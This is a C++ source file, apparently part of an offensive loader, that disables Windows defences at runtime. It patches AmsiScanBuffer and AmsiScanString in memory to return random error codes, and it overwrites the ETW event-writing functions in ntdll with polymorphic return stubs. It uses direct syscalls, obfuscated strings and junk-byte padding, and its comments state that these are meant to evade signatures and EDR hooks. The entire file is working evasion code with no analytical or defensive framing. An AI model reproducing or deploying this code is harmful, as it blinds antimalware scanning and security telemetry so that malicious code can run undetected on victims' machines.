#include "Bypass.h"
#include "Obfuscation.h"
#include "Internal.h"
#include "Syscalls.h"
#include "../../DebugLog.h"
#include "Polymorph.h"
#include <windows.h>
static bool SyscallProtect(PVOID address, SIZE_T size, ULONG newProtect, PULONG oldProtect) {
    PVOID base = address;
    SIZE_T sz  = size;
    SLOG("[BYPASS] SyscallProtect: addr=%p size=%zu prot=0x%X", address, size, newProtect);
    NTSTATUS status = Syscalls::NtProtectVirtualMemory(
        (HANDLE)-1, &base, &sz, newProtect, oldProtect);
    SLOG("[BYPASS] SyscallProtect result: 0x%X (base=%p sz=%zu oldProt=0x%X)", status, base, sz, *oldProtect);
    if (status == 0 && *oldProtect != 0) {
        return true;
    }
    SLOG("[BYPASS] Syscall suspect, trying VirtualProtect fallback");
    if (Internal::_VirtualProtect) {
        DWORD dwOld = 0;
        if (Internal::_VirtualProtect(address, size, newProtect, &dwOld)) {
            *oldProtect = dwOld;
            SLOG("[BYPASS] VirtualProtect fallback OK (oldProt=0x%X)", dwOld);
            return true;
        }
    }
    SLOG("[BYPASS] All protection methods FAILED");
    return false;
}

// Volatile byte-copy — avoids CRT memcpy import + EDR hooks on memcpy
static bool SafeWriteBytes(void* dst, const void* src, size_t len) {
    __try {
        volatile unsigned char* test = (volatile unsigned char*)dst;
        unsigned char orig = *test;
        *test = orig; 
        SLOG("[BYPASS] Test write OK at %p", dst);
        // Use volatile copy instead of memcpy — no CRT import, no EDR hook
        volatile unsigned char* d = (volatile unsigned char*)dst;
        const unsigned char* s = (const unsigned char*)src;
        for (size_t i = 0; i < len; i++) d[i] = s[i];
        SLOG("[BYPASS] SecureCopy(%p, %zu bytes) OK", dst, len);
        return true;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        SLOG("[BYPASS] EXCEPTION writing to %p! Code=0x%08X", dst, GetExceptionCode());
        return false;
    }
}

// Generate a random AMSI failure HRESULT each execution
// This defeats static signature matching on the well-known B8 57 00 07 80 C3 pattern
static void BuildAmsiPatch(unsigned char* patch, size_t* patchSize) {
    // mov eax, <random E_* HRESULT>; ret  (x64)
    // mov eax, <random E_* HRESULT>; ret <N>  (x86)
    // The HRESULT must have high bit set (error) and be non-zero
    DWORD randErr = 0;
    Internal::SecureRand(1); // warm up
    WORD lo = (WORD)(Internal::SecureRand(0xFFFE) + 1); // 1..0xFFFE
    randErr = 0x80070000UL | lo;  // FACILITY_WIN32 error

#ifdef _WIN64
    patch[0] = 0xB8; // mov eax, imm32
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);
    patch[5] = 0xC3; // ret
    *patchSize = 6;
#else
    patch[0] = 0xB8; // mov eax, imm32
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);
    // AmsiScanBuffer: ret 0x18 (6 params * 4)
    patch[5] = 0xC2;
    patch[6] = 0x18;
    patch[7] = 0x00;
    *patchSize = 8;
#endif
}

static void BuildAmsiScanStringPatch(unsigned char* patch, size_t* patchSize) {
    DWORD randErr = 0x80070000UL | (WORD)(Internal::SecureRand(0xFFFE) + 1);

#ifdef _WIN64
    patch[0] = 0xB8;
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);
    patch[5] = 0xC3;
    *patchSize = 6;
#else
    patch[0] = 0xB8;
    patch[1] = (unsigned char)(randErr & 0xFF);
    patch[2] = (unsigned char)((randErr >> 8) & 0xFF);
    patch[3] = (unsigned char)((randErr >> 16) & 0xFF);
    patch[4] = (unsigned char)((randErr >> 24) & 0xFF);
    // AmsiScanString: ret 0x08 (2 params * 4, __stdcall)
    patch[5] = 0xC2;
    patch[6] = 0x08;
    patch[7] = 0x00;
    *patchSize = 8;
#endif
}

// ── Polymorphic ETW Patch Builder ────────────────────────────────────
// Generates a unique "return STATUS_SUCCESS (0)" stub each execution.
// 8 equivalent zero-EAX encodings + random NOP-equivalent junk padding
// = no two runs produce the same byte sequence.
static void BuildEtwPatch(unsigned char* patch, size_t maxSize, size_t* patchSize) {
    size_t pos = 0;

    // 1) Random junk prefix (NOP-equivalents from Polymorph engine)
    if (Polymorph::FastRandRange(100) < 65) {
        size_t junkLen = 0;
        size_t maxJunk = (maxSize > 50) ? 15 : 5;
        Polymorph::GenerateJunk(patch + pos, maxJunk, &junkLen);
        pos += junkLen;
    }

    // 2) Zero EAX — 8 equivalent encodings, randomly chosen
    switch (Polymorph::FastRandRange(8)) {
        case 0: // xor eax, eax  (31 C0)
            patch[pos++] = 0x31; patch[pos++] = 0xC0; break;
        case 1: // xor eax, eax  (33 C0 — alternate modrm)
            patch[pos++] = 0x33; patch[pos++] = 0xC0; break;
        case 2: // sub eax, eax  (29 C0)
            patch[pos++] = 0x29; patch[pos++] = 0xC0; break;
        case 3: // sub eax, eax  (2B C0 — alternate)
            patch[pos++] = 0x2B; patch[pos++] = 0xC0; break;
        case 4: // push 0; pop rax/eax  (6A 00 58)
            patch[pos++] = 0x6A; patch[pos++] = 0x00; patch[pos++] = 0x58; break;
        case 5: // and eax, 0  (83 E0 00)
            patch[pos++] = 0x83; patch[pos++] = 0xE0; patch[pos++] = 0x00; break;
        case 6: { // mov eax, K; xor eax, K — random K each run
            DWORD key = Polymorph::FastRand();
            if (key == 0) key = 0xA3B7C1D5;
            patch[pos++] = 0xB8;
            *(DWORD*)(patch + pos) = key; pos += 4;
            patch[pos++] = 0x35;
            *(DWORD*)(patch + pos) = key; pos += 4;
            break;
        }
        default: { // mov eax, K; sub eax, K — random K each run
            DWORD key = Polymorph::FastRand();
            if (key == 0) key = 0xF2E8D4C6;
            patch[pos++] = 0xB8;
            *(DWORD*)(patch + pos) = key; pos += 4;
            patch[pos++] = 0x2D;
            *(DWORD*)(patch + pos) = key; pos += 4;
            break;
        }
    }

    // 3) Optional mid-junk before ret
    if (pos + 12 < maxSize && Polymorph::FastRandRange(100) < 40) {
        size_t junkLen = 0;
        Polymorph::GenerateJunk(patch + pos, 8, &junkLen);
        pos += junkLen;
    }

    // 4) Return instruction
#ifdef _WIN64
    patch[pos++] = 0xC3; // ret (caller cleanup)
#else
    patch[pos++] = 0xC2; // ret imm16 (__stdcall callee cleanup)
    patch[pos++] = 0x10; // 4 params * 4 = 0x10
    patch[pos++] = 0x00;
#endif

    *patchSize = pos;
}

namespace Bypass {
    static void PatchAmsi() {
        SLOG("[BYPASS] PatchAmsi() starting");
        auto amsiDll = OBFS_S("amsi.dll");
        SLOG("[BYPASS] Loading amsi.dll...");
        HMODULE hModule = Internal::_LoadLibraryA(amsiDll.c_str());
        if (!hModule) { SLOG("[BYPASS] amsi.dll not loaded (OK)"); return; }
        SLOG("[BYPASS] amsi.dll loaded at %p", hModule);

        // Patch AmsiScanBuffer with randomized HRESULT
        auto scanBuf = OBFS_S("AmsiScanBuffer");
        FARPROC f1 = Internal::_GetProcAddress(hModule, scanBuf.c_str());
        SLOG("[BYPASS] AmsiScanBuffer = %p", f1);
        if (f1) {
            ULONG oldProtect = 0;
            unsigned char patch[8];
            size_t patchSize = 0;
            BuildAmsiPatch(patch, &patchSize);
            if (SyscallProtect((PVOID)f1, patchSize, PAGE_READWRITE, &oldProtect)) {
                SLOG("[BYPASS] oldProtect was 0x%X", oldProtect);
                SLOG("[BYPASS] Writing AmsiScanBuffer patch (%zu bytes, randomized)...", patchSize);
                SafeWriteBytes(f1, patch, patchSize);
                SyscallProtect((PVOID)f1, patchSize, oldProtect, &oldProtect);
                SLOG("[BYPASS] AmsiScanBuffer done");
            }
            SECURE_WIPE_M(patch, sizeof(patch));
        }

        // Patch AmsiScanString with randomized HRESULT
        auto scanStr = OBFS_S("AmsiScanString");
        FARPROC f2 = Internal::_GetProcAddress(hModule, scanStr.c_str());
        SLOG("[BYPASS] AmsiScanString = %p", f2);
        if (f2) {
            ULONG oldProtect = 0;
            unsigned char patch[8];
            size_t patchSize = 0;
            BuildAmsiScanStringPatch(patch, &patchSize);
            if (SyscallProtect((PVOID)f2, patchSize, PAGE_READWRITE, &oldProtect)) {
                SLOG("[BYPASS] Writing AmsiScanString patch (%zu bytes, randomized)...", patchSize);
                SafeWriteBytes(f2, patch, patchSize);
                SyscallProtect((PVOID)f2, patchSize, oldProtect, &oldProtect);
                SLOG("[BYPASS] AmsiScanString done");
            }
            SECURE_WIPE_M(patch, sizeof(patch));
        }
        SLOG("[BYPASS] PatchAmsi() completed");
    }

    // Patch ETW event functions — polymorphic stub, unique each execution
    // Defeats signature-based detection of static byte patterns
    static void PatchSingleEtw(HMODULE hModule, const char* funcName) {
        FARPROC f = Internal::_GetProcAddress(hModule, funcName);
        SLOG("[BYPASS] %s = %p", funcName, f);
        if (!f) return;

        ULONG oldProtect = 0;
        unsigned char patch[64];
        size_t patchSize = 0;
        BuildEtwPatch(patch, sizeof(patch), &patchSize);

        if (SyscallProtect((PVOID)f, patchSize, PAGE_READWRITE, &oldProtect)) {
            SLOG("[BYPASS] Writing %s polymorphic patch (%zu bytes)...", funcName, patchSize);
            SafeWriteBytes(f, patch, patchSize);
            SyscallProtect((PVOID)f, patchSize, oldProtect, &oldProtect);
            SLOG("[BYPASS] %s done", funcName);
        }
        SECURE_WIPE_M(patch, sizeof(patch));
    }

    static void PatchEtw() {
        SLOG("[BYPASS] PatchEtw() starting");
        auto ntdllObj = OBFS_S("ntdll.dll");
        HMODULE hModule = Internal::_GetModuleHandleA(ntdllObj.c_str());
        if (!hModule) { SLOG("[BYPASS] ntdll.dll not found!"); return; }
        SLOG("[BYPASS] ntdll.dll at %p", hModule);

        // Patch all 3 ETW entry points
        auto etw1 = OBFS_S("EtwEventWrite");
        PatchSingleEtw(hModule, etw1.c_str());
        auto etw2 = OBFS_S("EtwEventWriteEx");
        PatchSingleEtw(hModule, etw2.c_str());
        auto etw3 = OBFS_S("EtwEventWriteFull");
        PatchSingleEtw(hModule, etw3.c_str());

        SLOG("[BYPASS] PatchEtw() completed");
    }

    void ExecuteAll() {
        SLOG("[BYPASS] ExecuteAll() starting");
        PatchAmsi();
        PatchEtw();
        SLOG("[BYPASS] ExecuteAll() completed");
    }
}
